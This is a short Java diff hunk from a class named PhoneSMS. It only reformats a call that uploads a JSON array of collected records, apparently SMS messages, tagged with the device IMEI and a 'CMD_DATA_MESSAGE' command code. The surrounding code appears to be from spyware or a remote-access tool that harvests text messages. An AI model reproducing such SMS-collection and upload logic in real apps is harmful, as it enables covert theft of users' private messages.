@@ -64,8 +64,7 @@ public class PhoneSMS {
                 }
                 cur.close();
 
-                UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length,
-                        Public.CMD_DATA_MESSAGE, Public.IMEI);
+                UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_MESSAGE, Public.IMEI);
                 return true;
             }
         }
